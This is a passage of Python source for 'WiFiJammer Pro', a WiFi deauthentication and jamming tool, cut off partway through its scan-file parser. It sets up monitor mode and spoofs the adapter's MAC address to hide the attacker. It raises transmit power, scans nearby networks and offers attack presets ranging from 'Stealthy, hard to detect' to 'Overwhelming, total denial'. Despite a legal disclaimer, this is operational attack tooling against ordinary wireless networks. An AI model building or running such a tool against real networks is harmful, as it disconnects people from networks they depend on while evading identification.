#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

"""
WiFiJammer Pro - Advanced WiFi Deauthentication Tool
=====================================================

A professional WiFi security testing tool for penetration testing and network analysis.

Features:
- Multi-threaded deauthentication attacks
- MAC address spoofing
- Real-time network monitoring
- Adaptive channel hopping
- Client targeting (broadcast + directed deauth)
- Display filters (Jamming Only, All Devices, APs Only, Clients Only)
- Multiple attack presets with realistic hardware-optimized values
- WPA2/WPA3 network support
- 2.4GHz and 5GHz band support
- MAC vendor identification
- Attack statistics and packet rate tracking

Author: S3rd4t4
Repository: https://github.com/s3rd4t4/wifijammer-pro
License: BSD-3-Clause

Inspired by: https://github.com/DanMcInerney/wifijammer

⚠️  LEGAL WARNING ⚠️
This tool is for authorized security testing only. Unauthorized use may violate
laws including the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK),
or similar legislation in your jurisdiction.

Usage:
    sudo python3 wifijammer.py

Requirements:
- Python 3.6+
- aircrack-ng suite
- scapy
- Wireless adapter with monitor mode and packet injection support

"""

import os
import sys
import subprocess
import time
from datetime import datetime, timedelta
from collections import deque
import threading
import signal as signal_module
import re
import termios
import tty
import select

# Enhanced color scheme
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    GRAY = '\033[90m'
    ORANGE = '\033[38;5;208m'

    LIGHT_GREEN = '\033[38;5;120m'
    LIME_GREEN = '\033[38;5;154m'
    FOREST_GREEN = '\033[38;5;28m'
    MINT_GREEN = '\033[38;5;121m'
    SPRING_GREEN = '\033[38;5;48m'

    DARK_CYAN = '\033[36m'
    DARK_MAGENTA = '\033[35m'
    DARK_GRAY = '\033[90m'

c = Colors()

# Configuration
VENV_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'venv')
VENV_ACTIVE = hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
MAC_DB_FILE = "mac-vendors.csv"
MAC_DB_URL = "https://maclookup.app/downloads/csv-database/get-db"

# Display filter modes
FILTER_JAMMING_ONLY = 1
FILTER_ALL = 2
FILTER_APS_ONLY = 3
FILTER_CLIENTS_ONLY = 4

display_filter = FILTER_JAMMING_ONLY
filter_lock = threading.Lock()

def clear_screen():
    """Clear screen without polluting terminal history"""
    os.system('clear' if os.name != 'nt' else 'cls')

def countdown(seconds=3, message="Starting next section"):
    for i in range(seconds, 0, -1):
        print(f"\r{c.BRIGHT_YELLOW}[→]{c.RESET} {message} in: {c.BRIGHT_CYAN}{i}{c.RESET}s...", end="", flush=True)
        time.sleep(1)
    print(f"\r{c.BRIGHT_GREEN}[✓]{c.RESET} {message}...     ")

def normalize_mac(mac):
    """Normalize MAC address to lowercase"""
    return mac.lower() if mac else mac

def get_power_color(power_str):
    try:
        power = int(power_str)
        abs_power = abs(power)
        if abs_power <= 59:
            return c.BRIGHT_GREEN
        elif abs_power <= 69:
            return c.BRIGHT_YELLOW
        elif abs_power <= 79:
            return c.ORANGE
        else:
            return c.BRIGHT_RED
    except:
        return c.WHITE

def get_protocol_color(protocol):
    protocol_upper = protocol.upper()

    if 'WPA3' in protocol_upper and 'WPA2' in protocol_upper:
        return c.BRIGHT_CYAN

    if 'WPA3' in protocol_upper:
        return c.BRIGHT_GREEN
    elif 'WPA2' in protocol_upper:
        return c.BRIGHT_YELLOW
    elif 'WPA' in protocol_upper:
        return c.ORANGE
    elif 'WEP' in protocol_upper:
        return c.BRIGHT_RED
    elif 'OPN' in protocol_upper or 'OPEN' in protocol_upper:
        return c.BRIGHT_RED
    else:
        return c.WHITE

# Channel definitions
CHANNELS_24GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
CHANNELS_5GHZ = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112,
                 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
CHANNELS_ALL = CHANNELS_24GHZ + CHANNELS_5GHZ

NOISE_FILTER = [
    'ff:ff:ff:ff:ff:ff',
    '00:00:00:00:00:00',
    '33:33:00:',
    '33:33:ff:',
    '01:80:c2:00:00:00',
    '01:00:5e:',
]

# Global state
clients_APs = []
APs = []
jam_new_channels = False  # Whether to jam newly discovered channels during jamming
original_mac = None
spoofed_mac = None
DN = None
lock = threading.Lock()
mon_iface = None
monchannel = None
selected_channels = []
selected_band = 'abg'  # WiFi band
mac_vendors = {}
deauth_count = 0
client_deauth_count = 0
start_time = None
running = True
tx_power = 30
packets_per_burst = 10
packet_delay = 0.01
deauth_code = 7
target_stats = {}
client_stats = {}
whitelist_bssids = set()
send_disas = True
num_workers = 3
whitelist_mode = False
selected_mode = None  # Track which mode: 1=Blacklist, 2=Whitelist, 3=All
adapter_health = {
    'last_check': None,
    'failures': 0,
    'status': 'OK'
}

# Display limits
MAX_APS_DISPLAY = 15
MAX_CLIENTS_PER_AP = 5

# Packet rate tracking
class PacketRateTracker:
    """Track packets per second using sliding window"""
    def __init__(self, window_seconds=1.0):
        self.window = window_seconds
        self.timestamps = deque()
        self.lock = threading.Lock()

    def add_packets(self, count):
        """Add packets sent at current time"""
        now = time.time()
        with self.lock:
            self.timestamps.append((now, count))
            self._cleanup_old()

    def _cleanup_old(self):
        """Remove timestamps outside window"""
        now = time.time()
        cutoff = now - self.window
        while self.timestamps and self.timestamps[0][0] < cutoff:
            self.timestamps.popleft()

    def get_rate(self):
        """Get packets per second"""
        with self.lock:
            self._cleanup_old()
            if not self.timestamps:
                return 0
            total = sum(count for _, count in self.timestamps)
            return total

# DEAUTH PRESETS
# Updated with realistic hardware limitations:
# - Scapy's sendp() minimum reliable delay: ~0.001s
# - Values below 0.001s cause unpredictable timing
# - Recommended: 0.01s+ for stability
DEAUTH_PRESETS = {
    '1': {
        'name': 'Stealthy',
        'description': 'Low intensity, hard to detect',
        'packets': 3,
        'delay': 0.5,
        'code': 1,
        'disas': False,
        'color': c.BRIGHT_BLUE
    },
    '2': {
        'name': 'Balanced',
        'description': 'Recommended - Good balance',
        'packets': 10,
        'delay': 0.01,
        'code': 7,
        'disas': True,
        'color': c.BRIGHT_GREEN
    },
    '3': {
        'name': 'Aggressive',
        'description': 'High intensity, fast disconnect',
        'packets': 15,
        'delay': 0.01,
        'code': 7,
        'disas': True,
        'color': c.BRIGHT_YELLOW
    },
    '4': {
        'name': 'Overwhelming',
        'description': 'Maximum power, total denial',
        'packets': 25,
        'delay': 0.005,
        'code': 2,
        'disas': True,
        'color': c.BRIGHT_RED
    },
    '5': {
        'name': 'Custom',
        'description': 'Manual configuration',
        'packets': None,
        'delay': None,
        'code': None,
        'disas': None,
        'color': c.BRIGHT_MAGENTA
    }
}

def cleanup_processes():
    try:
        subprocess.run(['pkill', '-9', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
    except:
        pass

    # Restart NetworkManager after script exit
    try:
        print(f"{c.ORANGE}[*]{c.RESET} Restarting NetworkManager...")
        subprocess.run(['systemctl', 'start', 'NetworkManager'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def cleanup_files():
    try:
        for f in os.listdir('.'):
            if f.startswith('scan-temp') or f.startswith('live-scan'):
                try:
                    os.remove(f)
                except:
                    pass
    except:
        pass

def detect_distro():
    if os.path.exists('/etc/debian_version'):
        return 'debian'
    elif os.path.exists('/etc/arch-release'):
        return 'arch'
    else:
        return 'unknown'

def check_dependencies():
    required = ['aircrack-ng', 'iw', 'ifconfig']
    missing = []
    for tool in required:
        try:
            subprocess.run([tool, '--version'], stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL, timeout=2)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing.append(tool)
    return missing

def install_dependencies():
    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    header = "SYSTEM DEPENDENCIES CHECK"
    print(f"{c.BRIGHT_YELLOW}{c.BOLD}{header.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    missing = check_dependencies()
    if not missing:
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} All system dependencies installed\n")
        countdown(3, "Proceeding to next section")
        return True

    print(f"{c.BRIGHT_YELLOW}[!]{c.RESET} Missing dependencies: {', '.join(missing)}\n")
    distro = detect_distro()

    if distro == 'unknown':
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} Could not detect distribution")
        return False

    print(f"[{c.ORANGE}*{c.RESET}] Installing dependencies...")

    try:
        if distro == 'debian':
            subprocess.run(['apt', 'update'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['apt', 'install', '-y', 'aircrack-ng', 'iw', 'net-tools'],
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif distro == 'arch':
            subprocess.run(['pacman', '-Sy', '--noconfirm'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['pacman', '-S', '--noconfirm', '--needed', 'aircrack-ng', 'iw', 'net-tools'], 
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} System dependencies installed\n")
        countdown(3, "Proceeding to next section")
        return True
    except subprocess.CalledProcessError:
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} Installation failed\n")
        return False

def setup_venv():
    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    header = "VIRTUAL ENVIRONMENT SETUP"
    print(f"{c.BRIGHT_YELLOW}{c.BOLD}{header.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    if VENV_ACTIVE:
        venv_display = sys.prefix.replace(os.path.expanduser('~'), '~')
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Already in venv: {c.BRIGHT_CYAN}{venv_display}{c.RESET}\n")
        countdown(3, "Proceeding to next section")
        return True

    python_path = os.path.join(VENV_PATH, 'bin', 'python3')

    if not os.path.exists(VENV_PATH):
        print(f"[{c.ORANGE}*{c.RESET}] Creating virtual environment...")
        try:
            subprocess.run([sys.executable, '-m', 'venv', VENV_PATH], check=True)
            print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Virtual environment created\n")
        except subprocess.CalledProcessError:
            print(f"{c.BRIGHT_RED}[✗]{c.RESET} Failed to create venv\n")
            return False

    print(f"[{c.ORANGE}*{c.RESET}] Installing packages (scapy, requests)...")
    try:
        subprocess.run([python_path, '-m', 'pip', 'install', '--quiet', 'scapy', 'requests'],
                      check=True, capture_output=True, text=True)
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Packages installed\n")
    except subprocess.CalledProcessError:
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} Failed to install packages\n")
        return False

    print(f"{c.BRIGHT_YELLOW}[→]{c.RESET} Relaunching in virtual environment...\n")
    time.sleep(1)
    os.execv(python_path, [python_path] + sys.argv)
    return True

def first_run_setup():
    if os.geteuid() != 0:
        print(f"\n{c.BRIGHT_RED}[✗] Root required{c.RESET}")
        print(f"{c.YELLOW}  Run: sudo {sys.argv[0]}{c.RESET}\n")
        sys.exit(1)

    if not install_dependencies():
        sys.exit(1)

    if not setup_venv():
        sys.exit(1)

missing_deps = check_dependencies()
if not VENV_ACTIVE and missing_deps:
    first_run_setup()

if not VENV_ACTIVE:
    first_run_setup()

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
conf.verb = 0

import random
import requests
from signal import SIGINT, signal

DN = open(os.devnull, 'w')

def download_mac_database():
    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print(f"{c.BRIGHT_YELLOW}{c.BOLD}{'MAC VENDOR DATABASE'.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    if os.path.exists(MAC_DB_FILE):
        file_age = time.time() - os.path.getmtime(MAC_DB_FILE)
        days_old = file_age / (60 * 60 * 24)
        if days_old < 30:
            print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} MAC database exists ({int(days_old)} days old)\n")
            return True

    print(f"[{c.ORANGE}*{c.RESET}] Downloading MAC vendor database...")

    try:
        response = requests.get(MAC_DB_URL, timeout=30, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        downloaded = 0

        with open(MAC_DB_FILE, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        percent = (downloaded / total_size) * 100
                        print(f"\r[{c.ORANGE}*{c.RESET}] Downloading... {percent:.1f}%", end="", flush=True)

        print(f"\r{c.BRIGHT_GREEN}[✓]{c.RESET} MAC database downloaded\n")
        return True
    except Exception as e:
        print(f"\r{c.BRIGHT_YELLOW}[!]{c.RESET} Download failed: {e}")
        print(f"{c.YELLOW}  Vendor lookup disabled{c.RESET}\n")
        return False

def load_mac_vendors():
    global mac_vendors
    if not os.path.exists(MAC_DB_FILE):
        return

    try:
        with open(MAC_DB_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                parts = line.strip().split(',')
                if len(parts) >= 2:
                    mac_prefix = parts[0].strip().upper().replace(':', '')
                    vendor = parts[1].strip()
                    if mac_prefix and vendor:
                        mac_vendors[mac_prefix] = vendor
    except:
        pass

def get_vendor(mac):
    if not mac_vendors:
        return "<unknown vendor>"

    mac_clean = mac.replace(':', '').replace('-', '').upper()
    for prefix_len in [6, 7, 9]:
        prefix = mac_clean[:prefix_len]
        if prefix in mac_vendors:
            return mac_vendors[prefix]

    return "<unknown vendor>"

def get_mac_address(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except:
        try:
            result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
            for line in result.stdout.split("\n"):
                if "link/ether" in line:
                    return line.split()[1].upper()
        except:
            pass
    return None

def generate_random_mac():
    mac = [0x00, random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    mac[0] = (mac[0] & 0xfe) | 0x02
    return ":".join([f"{b:02x}" for b in mac]).upper()

def spoof_mac(iface):
    global original_mac, spoofed_mac
    original_mac = get_mac_address(iface)
    spoofed_mac = generate_random_mac()

    print(f"[{c.ORANGE}*{c.RESET}] Spoofing MAC address...")
    print(f"  Original: {c.BRIGHT_YELLOW}{original_mac}{c.RESET}")
    print(f"  Spoofed:  {c.BRIGHT_GREEN}{spoofed_mac}{c.RESET}")

    try:
        subprocess.run(['ip', 'link', 'set', iface, 'down'], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', iface, 'address', spoofed_mac], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', iface, 'up'], check=True, capture_output=True)
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} MAC spoofed\n")
        return True
    except:
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} MAC spoofing failed\n")
        return False

def get_interfaces():
    ifaces = []
    try:
        for i in os.listdir("/sys/class/net"):
            if os.path.isdir(f"/sys/class/net/{i}/wireless") or os.path.isdir(f"/sys/class/net/{i}/phy80211"):
                ifaces.append(i)
    except:
        pass

    if not ifaces:
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            for line in result.stdout.split("\n"):
                if "Interface" in line:
                    i = line.split()[-1]
                    if i:
                        ifaces.append(i)
        except:
            pass

    return sorted(set(ifaces))

def select_interface():
    global mon_iface
    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print(f"{c.BOLD}{c.BRIGHT_YELLOW}{'INTERFACE SELECTION'.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    ifaces = get_interfaces()
    if not ifaces:
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} No wireless interfaces found\n")
        return False

    # Header with Vendor column
    print(f"{c.BOLD}#     Interface            MAC Address          Vendor                   Status{c.RESET}")
    print(f"{c.GRAY}{'─' * 80}{c.RESET}")

    for idx, iface in enumerate(ifaces, 1):
        mac = get_mac_address(iface) or "Unknown"
        vendor = get_vendor(mac)[:20] if mac != "Unknown" else "<unknown>"

        try:
            result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
            status = f"{c.BRIGHT_GREEN}Monitor{c.RESET}" if "Mode:Monitor" in result.stdout else f"{c.YELLOW}Managed{c.RESET}"
        except:
            status = f"{c.GRAY}Unknown{c.RESET}"

        print(f"{c.BRIGHT_CYAN}{str(idx).ljust(6)}{c.RESET}{c.BRIGHT_WHITE}{iface.ljust(21)}{c.RESET}{c.BRIGHT_YELLOW}{mac.ljust(21)}{c.RESET}{c.GRAY}{vendor.ljust(25)}{c.RESET}{status}")

    print()

    while True:
        try:
            choice = input(f"{c.BRIGHT_CYAN}Select interface [1-{len(ifaces)}]: {c.RESET}").strip()
            idx = int(choice)
            if 1 <= idx <= len(ifaces):
                mon_iface = ifaces[idx-1]
                print(f"\n{c.BRIGHT_GREEN}[✓]{c.RESET} Selected: {c.BRIGHT_CYAN}{mon_iface}{c.RESET}\n")
                countdown(2, "Proceeding")
                return True
        except ValueError:
            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid choice\n")
        except KeyboardInterrupt:
            print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
            return False

def set_monitor_mode(iface):
    print(f"[{c.ORANGE}*{c.RESET}] Setting monitor mode on {c.BRIGHT_CYAN}{iface}{c.RESET}...")

    try:
        subprocess.run(['ip', 'link', 'set', iface, 'down'], check=True, capture_output=True)
        subprocess.run(['iw', iface, 'set', 'monitor', 'none'], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', iface, 'up'], check=True, capture_output=True)
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Monitor mode enabled\n")
        countdown(2, "Proceeding")
        return True
    except:
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} Failed to enable monitor mode\n")
        return False


def reset_adapter(iface):
    print(f"[{c.ORANGE}*{c.RESET}] Resetting adapter...")
    try:
        subprocess.run(['ip', 'link', 'set', iface, 'down'], check=True, capture_output=True)
        time.sleep(1)
        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        subprocess.run(['iw', iface, 'set', 'monitor', 'none'], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', iface, 'up'], check=True, capture_output=True)
        time.sleep(1)
        print(f"[{c.BRIGHT_GREEN}✓{c.RESET}] Adapter reset")
        countdown(2, "Proceeding")
        return True
    except:
        return False

def select_tx_power():
    global tx_power
    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print(f"{c.BOLD}{c.BRIGHT_YELLOW}{'TX POWER CONFIGURATION'.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    print(f"  Range:   {c.BRIGHT_CYAN}1-30 dBm{c.RESET}")
    print(f"  Default: {c.BRIGHT_GREEN}30 dBm{c.RESET}\n")

    while True:
        try:
            choice = input(f"{c.BRIGHT_CYAN}Enter TX power [1-30] or press Enter for 30: {c.RESET}").strip()
            if not choice:
                tx_power = 30
                break
            power = int(choice)
            if 1 <= power <= 30:
                tx_power = power
                break
            else:
                print(f"{c.BRIGHT_RED}[!]{c.RESET} Must be between 1-30\n")
        except ValueError:
            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")
        except KeyboardInterrupt:
            print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
            return False

    print(f"\n[{c.ORANGE}*{c.RESET}] Setting TX power to {c.BRIGHT_GREEN}{tx_power} dBm{c.RESET}...")
    try:
        subprocess.run(['iw', 'dev', mon_iface, 'set', 'txpower', 'fixed', str(tx_power * 100)],
                      check=True, capture_output=True)
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} TX power set\n")
    except:
        print(f"{c.BRIGHT_YELLOW}[!]{c.RESET} Could not set TX power\n")

    countdown(2, "Proceeding")
    return True

def configure_deauth_params():
    global packets_per_burst, packet_delay, deauth_code, send_disas

    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print(f"{c.BOLD}{c.BRIGHT_YELLOW}{'DEAUTH PRESETS'.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    print(f"{c.BOLD}Select attack intensity preset:{c.RESET}\n")

    for key, preset in DEAUTH_PRESETS.items():
        color = preset['color']
        name = preset['name']
        desc = preset['description']

        if preset['packets'] is not None:
            details = f"({preset['packets']} pkts, {preset['delay']}s delay, code {preset['code']})"
            print(f"  {color}[{key}] {name.ljust(13)}{c.RESET} - {desc}")
            print(f"      {c.GRAY}{details}{c.RESET}")
        else:
            print(f"  {color}[{key}] {name.ljust(13)}{c.RESET} - {desc}\n")

    while True:
        try:
            choice = input(f"{c.BRIGHT_CYAN}Select preset [1-5] or Enter for 2 (Balanced): {c.RESET}").strip()

            if not choice:
                choice = '2'

            if choice in DEAUTH_PRESETS:
                preset = DEAUTH_PRESETS[choice]

                if choice == '5':
                    print()
                    while True:
                        try:
                            pkt_choice = input(f"{c.BRIGHT_CYAN}Packets per burst [1-100]: {c.RESET}").strip()
                            packets = int(pkt_choice)
                            if 1 <= packets <= 100:
                                packets_per_burst = packets
                                break
                            else:
                                print(f"{c.BRIGHT_RED}[!]{c.RESET} Must be between 1-100\n")
                        except ValueError:
                            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")

                    while True:
                        try:
                            delay_choice = input(f"{c.BRIGHT_CYAN}Delay [0.001-1.0]: {c.RESET}").strip()
                            delay = float(delay_choice)
                            if 0.001 <= delay <= 1.0:
                                packet_delay = delay
                                break
                            else:
                                print(f"{c.BRIGHT_RED}[!]{c.RESET} Must be between 0.001-1.0\n")
                        except ValueError:
                            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")

                    while True:
                        try:
                            code_choice = input(f"{c.BRIGHT_CYAN}Deauth code [1-8] or custom [0-255]: {c.RESET}").strip()
                            code = int(code_choice)
                            if 0 <= code <= 255:
                                deauth_code = code
                                break
                            else:
                                print(f"{c.BRIGHT_RED}[!]{c.RESET} Must be between 0-255\n")
                        except ValueError:
                            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")

                    disas_choice = input(f"{c.BRIGHT_CYAN}Send disassociation? [Y/n]: {c.RESET}").strip().lower()
                    send_disas = True if not disas_choice or disas_choice == 'y' else False
                else:
                    packets_per_burst = preset['packets']
                    packet_delay = preset['delay']
                    deauth_code = preset['code']
                    send_disas = preset['disas']

                packet_types = "deauth+disas" if send_disas else "deauth"
                print(f"\n{c.BRIGHT_GREEN}[✓]{c.RESET} Preset: {preset['color']}{preset['name']}{c.RESET}")
                print(f"    Packets={packets_per_burst}, Delay={packet_delay}s, Code={deauth_code}, Type={packet_types}\n")
                countdown(2, "Proceeding")
                return True
            else:
                print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid choice\n")
        except ValueError:
            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")
        except KeyboardInterrupt:
            print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
            return False

def select_band():
    global selected_channels

    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print(f"{c.BOLD}{c.BRIGHT_YELLOW}{'CHANNEL SELECTION'.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

    print(f"  {c.BRIGHT_CYAN}[1]{c.RESET} 2.4GHz (US)    - Ch 1-11")
    print(f"  {c.BRIGHT_CYAN}[2]{c.RESET} 2.4GHz (World) - Ch 1-13")
    print(f"  {c.BRIGHT_GREEN}[3]{c.RESET} 5GHz           - Ch 36-165")
    print(f"  {c.BRIGHT_YELLOW}[4]{c.RESET} All Channels\n")

    while True:
        try:
            choice = input(f"{c.BRIGHT_CYAN}Select preset [1-4]: {c.RESET}").strip()

            if choice == '1':
                selected_channels = CHANNELS_24GHZ[:11]
                selected_band = 'bg'
                break
            elif choice == '2':
                selected_channels = CHANNELS_24GHZ[:13]
                selected_band = 'bg'
                break
            elif choice == '3':
                selected_channels = CHANNELS_5GHZ
                selected_band = 'a'
                break
            elif choice == '4':
                selected_channels = CHANNELS_ALL
                selected_band = 'abg'
                break
            else:
                print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid choice\n")
        except KeyboardInterrupt:
            print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
            return False

    print(f"\n{c.BRIGHT_GREEN}[✓]{c.RESET} Selected {len(selected_channels)} channels\n")
    countdown(2, "Proceeding")
    return True

def scan_networks():
    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 130}{c.RESET}")
    print(f"{c.BOLD}{c.BRIGHT_YELLOW}{'NETWORK SCANNING'.center(130)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 130}{c.RESET}")

    cleanup_processes()
    cleanup_files()
    time.sleep(1)

    print(f"[{c.ORANGE}*{c.RESET}] Preparing adapter...")
    reset_adapter(mon_iface)

    band_name = "2.4 GHz" if selected_band == 'bg' else ("5 GHz" if selected_band == 'a' else "2.4 + 5 GHz")
    # Removed "Selected band:" message
    print(f"[{c.ORANGE}*{c.RESET}] Scanning for 30 seconds...")
    print(f"    {c.GRAY}Press Ctrl+C to stop early{c.RESET}")
    print()

    csv_prefix = "scan-temp"
    cmd = ['airodump-ng', '--band', selected_band, '--write', csv_prefix, '--output-format', 'csv', '--write-interval', '1', mon_iface]

    proc = None
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_file = f"{csv_prefix}-01.csv"

        for i in range(30, 0, -1):
            print(f"\r[{c.ORANGE}*{c.RESET}] Scanning.... {i} seconds", end="", flush=True)
            time.sleep(1)
        print()

    except KeyboardInterrupt:
        print(f"\n\n[{c.BRIGHT_RED}!{c.RESET}] Scan interrupted")
    finally:
        if proc:
            proc.terminate()
            proc.wait()
        time.sleep(1)

    print(f"\n[{c.BRIGHT_GREEN}✓{c.RESET}] Scan complete!")

    if not os.path.exists(csv_file):
        print(f"[{c.BRIGHT_RED}✗{c.RESET}] CSV file not found: {csv_file}")
        input(f"\n{c.BRIGHT_YELLOW}Press Enter to return to menu...{c.RESET}")
        return None, None

    aps, clients = parse_csv(csv_file)

    filt_aps = [ap for ap in aps if ap['channel'].isdigit() and int(ap['channel']) in selected_channels]
    ap_bssids = {ap['bssid'] for ap in filt_aps}
    filt_clients = [c for c in clients if c['ap_bssid'] in ap_bssids]

    cleanup_files()
    return filt_aps, filt_clients

def parse_csv(csv_file):
    aps = []
    clients = []

    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        ap_start = None
        client_start = None

        for i, line in enumerate(lines):
            if line.strip().startswith("BSSID"):
                ap_start = i
            elif line.strip().startswith("Station MAC"):
                client_start = i
                break

        if ap_start is None:
            return [], []

        for line in lines[ap_start+1:client_start if client_start else len(lines)]:
            if not line.strip() or line.strip().startswith("Station MAC"):
                break

            parts = [p.strip() for p in line.split(',')]
            if len(parts) < 14:
                continue

            bssid = normalize_mac(parts[0].strip())
            if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
                continue

            channel = parts[3].strip()
            if not channel or channel == "-1" or not channel.isdigit():
                continue

            privacy = parts[5].strip() if len(parts) > 5 else "OPN"
            cipher = parts[6].strip() if len(parts) > 6 else ""
            auth = parts[7].strip() if len(parts) > 7 else ""

            combined = f"{privacy} {cipher} {auth}".upper()

            has_wpa3 = "WPA3" in combined or "SAE" in combined
            has_wpa2 = "WPA2" in combined or "CCMP" in combined
            has_wpa = "WPA" in combined and "WPA2" not in combined and "WPA3" not in combined
            has_wep = "WEP" in combined

            if has_wpa3 and has_wpa2:
                protocol = "WPA2/WPA3"
            elif has_wpa3:
                protocol = "WPA3"
            elif has_wpa2:
                protocol = "WPA2"
            elif has_wpa:
                protocol = "WPA"
            elif has_wep:
                protocol = "WEP"
            elif privacy == "OPN" or privacy == "":
                protocol = "Open"
            else:
                protocol = privacy if privacy else "Unknown"

            essid = parts[13].strip() if len(parts) > 13 else ""
            power = parts[8].strip() if len(parts) > 8 else "-1"

            aps.append({
                "bssid": bssid,
                "channel": channel,
                "essid": essid,
                "power": power,
                "protocol": protocol
            })

        if client_start:
            for line in lines[client_start+1:]:
                if not line.strip():
                    continue

                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 6:
                    continue

                client_mac = normalize_mac(parts[0].strip())
                if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', client_mac):
                    continue

